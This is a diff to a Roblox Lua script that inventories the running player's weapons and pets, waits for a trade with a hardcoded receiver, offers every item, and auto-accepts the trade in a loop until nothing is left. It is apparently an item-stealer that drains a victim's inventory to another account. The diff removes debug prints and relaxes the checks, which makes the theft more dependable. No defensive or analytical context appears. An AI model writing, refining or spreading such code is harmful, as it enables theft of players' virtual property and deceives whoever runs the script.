@@ -87,14 +87,11 @@ local function inventoryMeow()
 end
 
 local function baiiii()
-    print("Running baiiii")
     local tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
 
     ownedWeapons, ownedPets = inventoryMeow()
-    print("Ran inventory check")
 
     while not tradeGUI.Enabled do
-        print("No trade GUI visible")
         if ownedWeapons and next(ownedWeapons) ~= nil or ownedPets and next(ownedPets) ~= nil then
             wait(1)
             local target = game:GetService("Players"):FindFirstChild(receiverName)
@@ -103,7 +100,7 @@ local function baiiii()
         end
     end
 
-    if ownedWeapons and next(ownedWeapons) ~= nil or ownedPets and next(ownedPets) ~= nil then
+    if ownedWeapons or ownedPets then
         local function offerItems(itemType, itemList)
             local args = {
                 [2] = itemType
@@ -125,18 +122,18 @@ local function baiiii()
                 ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
                 tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
             end
-            return
+            ownedWeapons, ownedPets = inventoryMeow()
+            return true
         end
-        ownedWeapons, ownedPets = inventoryMeow()
 
-        if ownedWeapons and next(ownedWeapons) ~= nil then
+        if ownedWeapons then
             if offerItems("Weapons", ownedWeapons) then
                 baiiii()
                 return
             end
         end
 
-        if ownedPets and next(ownedPets) ~= nil then
+        if ownedPets then
             if offerItems("Pets", ownedPets) then
                 baiiii()
                 return
